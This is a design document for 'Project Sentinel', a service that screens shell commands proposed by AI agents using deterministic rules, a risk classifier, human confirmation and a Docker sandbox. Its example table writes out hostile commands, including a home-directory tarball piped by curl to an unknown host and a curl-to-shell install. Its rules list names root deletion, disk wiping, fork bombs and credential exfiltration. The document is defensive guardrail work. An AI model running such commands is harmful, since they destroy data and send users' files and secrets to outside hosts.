# Project Sentinel: Software Design Document

## 1. Executive Summary

Project Sentinel is a backend security service for autonomous AI agents that can execute shell commands, Python snippets, AWS CLI calls, or other high-impact tool actions. Sentinel sits between the agent and the execution environment. Before a command runs, the agent sends Sentinel the user objective, recent action history, proposed command, and target environment. Sentinel applies deterministic policy rules first, invokes the ML model only for gray-area requests, decides whether to allow, block, or require confirmation, executes approved commands inside a local Docker sandbox for the Summer MVP, and logs every decision for auditing.

The project is not a website and does not require a full UI for v1. It is an API service plus a developer-facing CLI. The initial user is a DevOps or security engineer testing agent commands, local policies, and blocked-command logs from the terminal.

The core value is not "AI magically knows what is bad." The core value is a layered guardrail:

- Deterministic policy rules catch obvious high-risk patterns before model inference.
- A trained model estimates whether gray-area commands are risky relative to the stated context and recent action history.
- Risk tiers separate safe actions, suspicious actions, and actions that need human confirmation.
- Docker limits the blast radius of commands that are allowed to run in the Summer MVP, but it is not treated as a production-grade security boundary.
- SQLite stores a local, queryable audit trail for review, with a JSONL export for debugging.

## 2. Goals and Non-Goals

### 2.1 Goals

- Build a working command-interception API for AI agents.
- Train a PyTorch model that classifies `(context, recent_actions, command, environment)` inputs by risk.
- Serve the trained model through ONNX Runtime for fast, lightweight inference.
- Short-circuit deterministic rules and environment policy before invoking model inference.
- Combine model score, rules, recent action history, and environment policy instead of relying on a single threshold.
- Explicitly distinguish malicious behavior from authorized destructive behavior.
- Run allowed commands inside a restricted Docker sandbox, not directly on the host.
- Log all decisions to a local SQLite audit store behind a swappable `AuditStore` interface, with a JSONL export for debugging.
- Produce measurable results: recall, false positive rate, latency, and sandbox behavior.
- Provide a developer-facing CLI for local evaluation, policy testing, sandboxed execution, and audit-log review.

### 2.2 Non-Goals for v1

- Guaranteeing perfect safety for all agents.
- Running untrusted commands on production hosts.
- Supporting every agent framework on day one.
- Building a full web dashboard.
- Running expensive always-on AWS infrastructure.
- Treating local Docker as sufficient isolation for enterprise multi-tenant execution.
- Replacing human approval for high-impact actions.
- Building a general antivirus or endpoint detection product.

## 3. Key Product Principle: Malicious vs. Destructive

Sentinel must not treat every destructive command as malicious. Many legitimate maintenance tasks are destructive:

- Cleaning build outputs.
- Deleting temporary files.
- Dropping a test database.
- Reformatting a disposable sandbox.
- Recreating infrastructure in a dev account.

Sentinel also needs to treat high-impact outbound actions as risky even when they are not "destructive" in the filesystem sense. For example, an agent that mass-sends internship emails can create real harm if it emails the wrong recipients, sends an unreviewed message, leaks personal information, or spams companies. These actions should often require confirmation or recipient validation.

The central design rule:

> A command is dangerous based on intent, scope, environment, and authorization, not just its text.

### 3.1 Definitions

- **Safe:** Low-risk command that matches the user's objective and has limited side effects.
- **Destructive but authorized:** Command has meaningful side effects, but the user clearly requested it and the environment/scope is appropriate.
- **Suspicious:** Command may be legitimate, but the context is vague, the scope is broad, or the command pattern often appears in attacks.
- **Malicious or agent-gone-haywire:** Command conflicts with the user's objective, attempts exfiltration, privilege escalation, sabotage, credential theft, persistence, or broad destructive action without clear authorization.
- **Unknown:** Sentinel cannot confidently decide and should fail closed or ask for confirmation depending on environment.

### 3.2 Example Context Dependence

| Context | Command | Expected Decision |
| --- | --- | --- |
| "Clean build artifacts for this repo" | `rm -rf ./dist ./build` | Allow in sandbox/dev |
| "Summarize project files" | `rm -rf ./dist ./build` | Block or confirm |
| "Delete this disposable test database" | `dropdb sentinel_test` | Confirm, then allow in sandbox/dev |
| "Back up my home directory" | `tar czf - ~ | curl -X POST https://unknown.site --data-binary @-` | Block |
| "List files" | `ls -la` | Allow |
| "Install dependencies" | `curl https://unknown.site/install.sh | sh` | Confirm or block depending on policy |
| "Send internship outreach emails to my reviewed recipient list" | `python send_emails.py --recipients reviewed_startups.csv --template approved_email.md` | Confirm, then allow |
| "Draft internship outreach emails for review" | `python send_emails.py --recipients all_contacts.csv --send-now` | Block or confirm |

## 4. High-Level Architecture

```text
Developer CLI or agent client
        |
        | POST /execute
        v
Sentinel FastAPI service
        |
        | validate request
        v
Decision engine
        |
        |-- deterministic policy prefilter
        |-- recent action history
        |-- ONNX model risk score for gray-area requests
        |-- environment policy
        |-- confirmation state
        v
Verdict: allow / warn / confirm_required / block
        |
        | if allow
        v
Local Docker executor sandbox
        |
        | stdout, stderr, exit code, timeout
        v
Response to agent
        |
        v
Audit log to local SQLite store
```

## 5. Main Components

### 5.1 Data Pipeline

Purpose: Build reproducible training and evaluation datasets.

Responsibilities:

- Ingest public benchmark traces where possible, such as CUAHarm and OS-Harm.
- Add hand-written and synthetic examples for context-dependent command risk.
- Represent recent agent behavior through a rolling action window, such as the last 3-5 commands, file reads, tool calls, network targets, and sensitive resources accessed.
- Normalize each example into a common JSONL schema.
- Split examples into train, validation, and test sets.
- Track source and category for later error analysis.

Important: Labels must reflect whether the command is appropriate for the context and recent session history, not whether the command looks scary in isolation.

Examples without available history should be normalized to `recent_actions: []`. The normalized schema should support sequence-aware examples without invalidating the original curated seed set.

### 5.2 PyTorch Training Pipeline

Purpose: Train the risk model locally, using the available 3070 GPU.

Responsibilities:

- Load JSONL data.
- Fine-tune a small text classifier such as DistilBERT.
- Train on combined text such as:
  - user objective
  - recent action history
  - command
  - environment
- Optimize primarily for high recall on truly dangerous behavior while tracking false positives.
- Save model artifacts.
- Export the final model to ONNX for serving.

PyTorch is used for training. The API server should prefer ONNX Runtime for production inference.

### 5.3 Rules Baseline

Purpose: Provide a deterministic safety floor and avoid unnecessary model inference for obvious cases.

Rules should catch obvious high-risk patterns even if the model is uncertain:

- `rm -rf /`
- `mkfs`, `dd if=... of=/dev/...`
- credential file reads followed by network upload
- suspicious `curl | sh` or `wget | bash`
- destructive AWS CLI commands against non-sandbox environments
- privilege escalation patterns
- fork bombs or resource exhaustion patterns
- attempts to disable logging, delete audit files, or hide activity

Rules must be scoped. For example, `rm -rf ./build` is different from `rm -rf /`.

Rules also own short-circuit routing:

- Critical block rules return immediately without ONNX inference.
- Explicit low-risk allow rules may skip ONNX inference in trusted sandbox contexts.
- Ambiguous gray-area requests continue to the model.
- Every decision records its routing path: `rules`, `policy`, `model`, or `combined`.

In addition to built-in rules, users should be able to define custom deny/confirm rules as a second security layer on top of their agent's own rules and skills. Example: a team testing an agentic browser against Slack writes a custom rule blocking access to external or important channels. User rules use a simple declarative format (pattern, scope, verdict, reason), run in the deterministic layer before model inference, and may only escalate — they can never downgrade a built-in block. Command/path/domain matching ships first; action-level integrations (like Slack channel awareness) require agent adapters and are post-summer scope.

### 5.4 Decision Engine

Purpose: Combine deterministic rules, recent action history, model score, environment, and confirmation state into a final verdict.

Inputs:

- `context`
- `recent_actions`
- `command`
- `environment`
- `user_id` or session ID if available
- `agent_id` if available
- `user_confirmed`
- triggered rules
- model risk score when inference is needed
- routing path

Outputs:

- `allow`
- `warn`
- `confirm_required`
- `block`
- reason codes

The decision engine should be explainable. Each response should include a concise reason such as:

- `rule:destructive-root-delete`
- `model:high-risk-score`
- `policy:production-requires-confirmation`
- `confirmation:missing`
- `environment:sandbox-allowed`

### 5.5 Confirmation Flow

Purpose: Handle cases where the agent may be doing something drastic but possibly intended.

For v1, this can be API-based instead of a full UI.

Possible flow:

1. Agent sends a risky command to `POST /execute`.
2. Sentinel returns `409 Conflict` or `202 Accepted` with `verdict: "confirm_required"` and a `confirmation_id`.
3. A human or test script calls `POST /confirm` with that `confirmation_id`.
4. Sentinel records the confirmation.
5. Agent retries the command with the confirmation token or `user_confirmed: true`.
6. Sentinel allows execution only if the command, context, and environment match the confirmed request.

Confirmation should not be a generic bypass. It should be tied to the exact request or a stable request hash.

### 5.6 Response Strategy

Purpose: Control what Sentinel returns to the agent after a decision. The response should help safe agents recover, stop obviously dangerous actions, and preserve auditability.

Sentinel should support these response modes:

| Mode | Use Case | Behavior |
| --- | --- | --- |
| Hard block | Clearly malicious or critical commands | Return a blocked verdict, do not execute, log the reason, and use an HTTP status such as `403` when the integration supports it. |
| Confirmation request | Suspicious or destructive but possibly authorized commands | Return `confirm_required`, a `confirmation_id`, reasons, and instructions for getting a confirmation token. |
| Educational refusal | Well-behaved agent made a risky mistake | Return a clear explanation and suggested safer alternatives so the agent can revise its next action. |
| Soft tool error | Agent framework expects tool-like output instead of HTTP errors | Return a structured JSON response with `verdict: "block"` while keeping the HTTP transport successful if needed by the framework. |

Default v1 behavior:

- Use hard blocks for critical commands.
- Use confirmation requests for high-risk but possibly legitimate commands.
- Include structured reasons and safer alternatives when possible.
- Prefer transparent responses that help the agent recover instead of retrying the same unsafe command.

Example blocked response with agent guidance:

```json
{
  "request_id": "uuid",
  "verdict": "block",
  "risk_score": 0.96,
  "risk_tier": "critical",
  "reasons": ["rule:credential-exfiltration", "policy:block-critical"],
  "agent_message": "This command appears to read sensitive credentials and send them to an external host. Do not retry this action. If your goal is to inspect configuration safely, request a local redacted environment summary instead.",
  "suggested_safe_actions": [
    "Print non-sensitive configuration keys only.",
    "Ask the user for confirmation before accessing secrets.",
    "Run a local secret scan without uploading results."
  ],
  "execution": null
}
```

Example confirmation response:

```json
{
  "request_id": "uuid",
  "verdict": "confirm_required",
  "risk_score": 0.74,
  "risk_tier": "high",
  "confirmation_id": "uuid",
  "agent_message": "This command may be legitimate, but it can rewrite Git history. Ask the user to approve this exact command before retrying with a confirmation token.",
  "suggested_safe_actions": [
    "Use a normal push if possible.",
    "Create a backup branch before force pushing."
  ],
  "execution": null
}
```

For OpenClaw or other agent frameworks, the adapter may need to translate Sentinel responses into the format the agent expects. The adapter should preserve the verdict and reasons even if it must return a tool-shaped message instead of a raw HTTP error.

### 5.7 Docker Executor

Purpose: Run approved commands in an isolated environment.

Sentinel should not run approved commands directly on the host. For the Summer MVP, the API service should launch a separate Docker executor container with strict limits.

Docker is not a true security boundary. It is acceptable for local proof-of-concept execution and developer policy testing, but enterprise workloads should eventually move to managed, stronger isolation such as ECS/Fargate task-per-execution, EKS/Kubernetes Jobs with strict pod security and network policy, or Firecracker-style microVMs.

Recommended restrictions:

- non-root user
- short timeout
- memory limit
- CPU limit
- no network by default
- restricted mounted workspace
- no Docker socket inside the executor
- read-only root filesystem where possible
- clear cleanup after execution

The executor returns:

- `stdout`
- `stderr`
- `exit_code`
- `timed_out`
- `duration_ms`

### 5.8 Audit Logger

Purpose: Preserve a trace of every decision.

Primary target: local SQLite database using Python's built-in `sqlite3` module, behind an `AuditStore` interface with `write()` and `query()` methods.

Export format: JSONL for easy inspection, debugging, and portability.

The `AuditStore` interface keeps the storage backend swappable: a hosted deployment can later use DynamoDB or Postgres without changing decision or API code. An optional DynamoDB-backed store is a stretch task, not a core dependency.

Every request should be logged, including blocked and malformed requests when possible.

### 5.9 Developer CLI

Purpose: Provide the primary Summer MVP interface for DevOps and security engineers.

Responsibilities:

- Evaluate commands locally against rules, policy, recent action history, and model routing.
- Run approved commands through the local Docker executor.
- Validate and explain policy files.
- Inspect the local SQLite audit logs.
- Expose human-readable output and machine-readable `--json` output for CI workflows.

## 6. Technology Stack

| Layer | Choice | Reason |
| --- | --- | --- |
| Training | Python, PyTorch, Hugging Face Transformers | Standard ML workflow for text classification |
| Model | DistilBERT or similar small encoder | Fast enough for local training and CPU inference |
| Inference | ONNX Runtime | Lighter production serving than full PyTorch |
| API | FastAPI, Uvicorn | Common Python API stack, auto docs, typed request models |
| Sandbox | Docker | Standard packaging and command isolation tool |
| Logging | SQLite with JSONL export | Local-first, zero setup, real SQL querying; swappable to a managed DB for hosted deployments |
| Deployment | Local Docker first; optional EC2; stretch ECS/Fargate + API Gateway | Avoids needing AWS credits for the core project |
| Testing | pytest | Standard Python testing |

## 7. API Design

### 7.1 `POST /evaluate` and `POST /execute`

Purpose:

- `POST /evaluate`: evaluate a command and return a verdict without execution.
- `POST /execute`: evaluate first, then execute only if the verdict is `allow`.

Request:

```json
{
  "context": "Clean build artifacts for this repository.",
  "recent_actions": [
    {
      "type": "command",
      "summary": "Listed project files with ls -la",
      "sensitive_resources": []
    }
  ],
  "command": "rm -rf ./dist ./build",
  "environment": "sandbox",
  "session_id": "session-uuid",
  "user_id": "local-user",
  "agent_id": "openclaw-dev",
  "user_confirmed": false,
  "confirmation_token": null
}
```

Response when allowed:

```json
{
  "request_id": "uuid",
  "verdict": "allow",
  "risk_score": 0.18,
  "risk_tier": "low",
  "reasons": ["model:low-risk", "environment:sandbox"],
  "routing_path": "model",
  "execution": {
    "stdout": "output...",
    "stderr": "",
    "exit_code": 0,
    "timed_out": false,
    "duration_ms": 142
  }
}
```

Response when blocked:

```json
{
  "request_id": "uuid",
  "verdict": "block",
  "risk_score": 0.96,
  "risk_tier": "critical",
  "reasons": ["rule:destructive-root-delete", "policy:block-critical"],
  "routing_path": "rules",
  "agent_message": "This command attempts broad destructive deletion and was blocked. Do not retry this command. Ask the user for a safer scoped cleanup target.",
  "suggested_safe_actions": ["List candidate cleanup directories first.", "Delete only a scoped sandbox path after confirmation."],
  "execution": null
}
```

Response when confirmation is required:

```json
{
  "request_id": "uuid",
  "verdict": "confirm_required",
  "risk_score": 0.77,
  "risk_tier": "high",
  "confirmation_id": "uuid",
  "reasons": ["model:high-risk", "policy:destructive-command-requires-confirmation"],
  "routing_path": "combined",
  "agent_message": "This command may be legitimate, but it is high risk. Ask the user to approve this exact command before retrying with a confirmation token.",
  "suggested_safe_actions": ["Explain why the command is necessary.", "Offer a lower-risk alternative if one exists."],
  "execution": null
}
```

### 7.2 `POST /confirm`

Purpose: Confirm a high-risk action before execution.

Request:

```json
{
  "confirmation_id": "uuid",
  "confirmed_by": "local-user",
  "decision": "approve",
  "note": "This is a disposable sandbox cleanup."
}
```

Response:

```json
{
  "confirmation_id": "uuid",
  "status": "approved",
  "confirmation_token": "signed-or-random-token"
}
```

### 7.3 `GET /health`

Purpose: Basic service health check.

Response:

```json
{
  "status": "ok",
  "model_loaded": true,
  "logger": "sqlite"
}
```

## 8. Data Schema

### 8.1 Training Example Schema

```json
{
  "id": "example-001",
  "context": "Clean build artifacts for this repository.",
  "recent_actions": [
    {
      "type": "command",
      "summary": "Ran tests and produced build artifacts.",
      "sensitive_resources": []
    }
  ],
  "command": "rm -rf ./dist ./build",
  "environment": "sandbox",
  "label": 0,
  "risk_category": "authorized_destructive",
  "source": "synthetic",
  "notes": "Destructive but scoped to build folders and aligned with context and recent actions."
}
```

Labels:

- `0`: allowed or low-risk for the given context and recent action history.
- `1`: malicious, unauthorized, or unsafe for the given context and recent action history.

Recommended categories:

- `safe_read_only`
- `safe_build_or_install`
- `authorized_destructive`
- `ambiguous_requires_confirmation`
- `data_exfiltration`
- `credential_theft`
- `privilege_escalation`
- `system_destruction`
- `network_abuse`
- `external_communication`
- `defense_evasion`
- `policy_violation`

### 8.2 Audit Log Schema

```json
{
  "request_id": "uuid",
  "timestamp": 1760000000,
  "user_id": "local-user",
  "agent_id": "openclaw-dev",
  "session_id": "session-uuid",
  "environment": "sandbox",
  "recent_action_summary": "Listed files, ran tests, then requested build cleanup.",
  "context_summary": "Clean build artifacts...",
  "command": "rm -rf ./dist ./build",
  "risk_score": 0.18,
  "risk_tier": "low",
  "verdict": "allow",
  "routing_path": "model",
  "rules_triggered": [],
  "confirmation_id": null,
  "execution_exit_code": 0,
  "execution_timed_out": false,
  "duration_ms": 142
}
```

## 9. Risk Tiers and Decision Policy

The exact thresholds should be calibrated on validation data. Initial values are placeholders.

| Tier | Example Score | Default Action | Notes |
| --- | --- | --- | --- |
| Low | 0.00-0.35 | Allow in sandbox/dev | Still log |
| Medium | 0.35-0.65 | Allow in sandbox, warn in dev, confirm in production | Useful for ambiguous commands |
| High | 0.65-0.85 | Confirm required | Destructive or suspicious but not automatically malicious |
| Critical | 0.85-1.00 or critical rule | Block | Obvious exfiltration, root wipe, credential theft |

Environment overrides:

- `sandbox`: most forgiving, but still blocks critical rules.
- `dev`: moderate; destructive commands often require confirmation.
- `production`: strict; high-risk commands require confirmation, critical commands block.

Confirmation overrides:

- Confirmation may allow high-risk actions in sandbox/dev.
- Confirmation should not allow critical blocked actions unless an explicit break-glass mode is added later.
- Confirmation must be tied to the exact command/context/environment to prevent generic bypass.

## 10. Edge Cases and Expected Behavior

| Edge Case | Expected Behavior |
| --- | --- |
| User intentionally wants to delete a scoped folder | Confirm or allow if scoped and in sandbox/dev |
| Agent unexpectedly deletes files during unrelated task | Block or require confirmation |
| Command looks safe but exfiltrates data through network | Block if rule/model catches; no network in sandbox by default |
| Command looks safe by itself but follows sensitive file access | Use recent action history to raise risk, require confirmation, or block depending on the sequence |
| Agent reads `.env` then runs `ls -la` | `ls -la` may remain safe, but the session should be marked sensitive for later actions such as network uploads |
| Agent reads secrets then sends outbound network data | Block as sequence-based exfiltration even if the upload command is generic |
| Command uses obfuscation or encoding | Model and rules should flag many cases; log misses for future data |
| Model says safe but rule says critical | Critical rule wins |
| Rule says suspicious but model says safe | Escalate to medium/high tier |
| Critical rule matches before model inference | Short-circuit and block without calling ONNX |
| Low-risk allow rule matches trusted sandbox command | Allow without model inference when policy permits, and log routing path |
| Agent framework retries blocked commands blindly | Return structured `agent_message` and `suggested_safe_actions`; adapter may convert this into a tool-shaped refusal |
| User asks why a command was blocked | Return reason codes and a human-readable explanation |
| Command is high risk but likely intended | Return `confirm_required`, not fake success |
| AWS logging fails | Return response if execution decision is complete, write local fallback log, expose warning |
| Docker execution times out | Kill executor, return timeout, log event |
| Executor image missing | Return service error, do not run on host |
| Agent-framework adapter unavailable | Use the Sentinel CLI and API directly; framework adapters are post-summer integrations |
| User confirmation token reused for different command | Reject |
| Environment missing from request | Default to strict mode or reject request |
| Command tries to access Docker socket | Block by policy and do not mount socket |

## 11. Security Model

### 11.1 Trust Boundaries

- Agent input is untrusted.
- Command text is untrusted.
- User-provided context may be incomplete or misleading.
- Model predictions are advisory, not absolute truth.
- Local Docker sandbox reduces risk for the Summer MVP but is not treated as a production security boundary.
- Audit logs should be append-only from the application's perspective.

### 11.2 Safety Rules

- Never run approved commands directly on the host in production mode.
- Never mount the host root filesystem into the executor.
- Never mount the Docker socket into the executor.
- Default executor network to disabled.
- Use timeouts for every command.
- Use resource limits for every command.
- Log blocked attempts.
- Fail closed when the decision engine cannot decide safely.
- Deterministic critical rules must run before model inference.
- Store enough recent action history to detect suspicious sequences, but avoid storing unnecessary secrets or raw sensitive file contents.

## 12. AWS and Deployment Plan

### 12.1 No-Credits Path

The project should not depend on AWS credits.

Minimum AWS usage:

- Run Sentinel locally in Docker.
- Keep audit logs in the local SQLite store; AWS is not required for the Summer MVP.
- Optional stretch: implement a DynamoDB-backed `AuditStore` behind the existing interface for hands-on AWS experience.

This keeps costs at zero while preserving a clean migration path to AWS for a hosted deployment.

### 12.2 Optional Cloud Deployment

If time and budget allow:

- Deploy Sentinel on EC2 free tier running Docker.
- Stretch: deploy to ECS/Fargate behind API Gateway for a short-lived demo.
- Destroy expensive resources after testing.

The architecture should support cloud deployment, but the core project must work locally.

### 12.3 Enterprise Execution Direction

Post-summer enterprise execution should not rely on `docker run` on a shared host.

Longer-term options:

- ECS/Fargate task-per-execution for managed ephemeral containers.
- EKS or Kubernetes Jobs with admission control, Pod Security Standards, namespace isolation, and network policies.
- Firecracker-style microVM isolation for stronger tenant boundaries.
- Per-tenant egress controls, encrypted ephemeral workspaces, and centralized executor fleet monitoring.

## 13. Repository Structure

Planned structure:

```text
sentinel/
  README.md
  Final Plan.md
  Weekly Structure.md
  data/
    raw/
    processed/
    examples/
  src/
    sentinel/
      api/
        main.py
        schemas.py
      decision/
        engine.py
        rules.py
        policy.py
        routing.py
      model/
        inference.py
      execution/
        docker_executor.py
      logging/
        audit.py
        sqlite_store.py
        jsonl_export.py
      session/
        history.py
      cli/
        main.py
      config.py
  scripts/
    data_pipeline.py
    train_guardrail.py
    export_onnx.py
    evaluate_model.py
  infra/
    README.md
  tests/
    test_rules.py
    test_policy.py
    test_api.py
    test_executor.py
  Dockerfile
  docker-compose.yml
  pyproject.toml
```

## 14. Implementation Order

1. Threat model and starter dataset.
2. Data pipeline and train/eval split.
3. Rules baseline, deterministic short-circuit routing, and baseline metrics.
4. First PyTorch classifier using recent action history.
5. ONNX export and inference wrapper.
6. FastAPI `POST /execute` endpoint.
7. Decision engine with risk tiers, policy files, and model-only-for-gray-area routing.
8. Dockerized Sentinel service.
9. Local Docker executor for approved commands with documented security limitations.
10. SQLite audit logging with JSONL export.
11. Developer CLI for evaluation, policy testing, and execution.
12. CLI audit-log workflows and Summer MVP release candidate.

## 15. Evaluation Plan

### 15.1 Model Metrics

- Recall on dangerous examples.
- False positive rate on safe and authorized destructive examples.
- Precision on dangerous predictions.
- Confusion matrix by risk category.
- Performance against rules-only baseline.
- Performance on sequence-dependent examples.

### 15.2 System Metrics

- p50/p99 model inference latency.
- Percentage of requests short-circuited before model inference.
- p50/p99 full API latency.
- Docker sandbox execution overhead.
- Timeout handling correctness.
- Audit log success rate.

### 15.3 Product Value Metrics

- Number of dangerous commands blocked.
- Number of authorized destructive commands correctly allowed or confirmed.
- Number of false blocks on legitimate tasks.
- Quality of reasons returned to the user or agent.

## 16. Testing Strategy

- Unit tests for rules.
- Unit tests for policy decisions.
- Unit tests for confirmation token behavior.
- API tests for allowed, blocked, confirm-required, and malformed requests.
- Executor tests for timeout, no-network behavior, and blocked host access.
- Integration tests for request -> decision -> execution -> audit log.
- Golden examples for context-dependent commands.
- Golden examples for sequence-dependent commands.

## 17. Developer CLI Plan

The Summer MVP should prioritize a developer-facing CLI over agent-framework adapters.

Required CLI workflows:

- `sentinel eval --context "..." --command "..."` for local command evaluation.
- `sentinel eval --history history.json --context "..." --command "..."` for sequence-aware evaluation.
- `sentinel run --context "..." --command "..."` for evaluate-then-execute sandboxed runs.
- `sentinel policy validate sentinel.policy.yaml` for local policy validation.
- `sentinel policy explain --command "..."` for explaining deterministic routing and model usage.
- `sentinel logs list --blocked`, `sentinel logs show <request_id>`, and `sentinel logs tail` for audit review.
- `--json` output for CI and automation.

The CLI should expose whether a request was decided by rules, policy, model, or combined routing so DevOps users can understand latency and enforcement behavior.

### 17.1 Real-Agent Testing Position

Real-agent testing should remain part of the product validation path, but it should not displace the Summer MVP's CLI and engine work.

Summer target:

- Define the adapter contract a real agent must satisfy:
  - send `context`, `recent_actions`, `command`, `environment`, `session_id`, and agent identity,
  - interpret `allow`, `warn`, `confirm_required`, and `block`,
  - preserve Sentinel's `agent_message`, `suggested_safe_actions`, and reason codes,
  - update recent-action history after each tool call.
- If OpenClaw exposes a clean command/tool interception hook, run a non-blocking smoke test against Sentinel.

Post-summer target:

- Build a first-class OpenClaw adapter or plugin.
- Add a real-agent validation harness that replays representative tasks through Sentinel.
- Expand from OpenClaw to MCP, LangChain, AutoGen, Cursor tools, and CI agents.

## 18. Post-Summer Enterprise Roadmap

Potential features if Sentinel grows beyond the local-first Summer MVP:

- Enterprise web dashboard for audit logs, command timelines, model-score distributions, and blocked actions.
- Human-in-the-loop approval queues for exact high-risk actions.
- API key management, scoped service tokens, organizations, roles, and workspace-level policy.
- Policy templates for sandbox, dev, staging, production, cloud accounts, and external communication workflows.
- SIEM and observability integrations: Datadog, Splunk, CloudWatch, OpenTelemetry, and webhooks.
- Managed execution infrastructure:
  - ECS/Fargate task-per-execution,
  - EKS/Kubernetes Jobs with Pod Security Standards, admission control, namespace isolation, and network policies,
  - Firecracker-style microVM isolation for stronger tenant boundaries.
- Per-tenant egress controls, encrypted ephemeral workspaces, cluster quotas, and executor fleet monitoring.
- Real-agent validation harness and integrations for OpenClaw, MCP, LangChain, AutoGen, Cursor tools, and CI agents.
- Signed user intent so authorized destructive work can be distinguished from agent drift.
- Continuous learning from reviewed audit logs, with shadow-mode evaluation before enforcing new model versions.
- Multi-tenant hosted version with private model deployment and air-gapped enterprise deployment options.

## 19. Final Positioning

Sentinel should be presented as:

> A local-first enterprise guardrail engine for AI-agent actions that combines deterministic short-circuit policy rules, sequence-aware PyTorch/ONNX risk scoring, confirmation workflows, local Docker proof-of-concept execution, a developer CLI, and AWS audit logging.

The honest claim:

> Sentinel does not guarantee perfect safety. It provides measurable, layered risk reduction for agent command execution, with special attention to recent action history, deterministic policy enforcement, and the distinction between malicious behavior and authorized destructive work.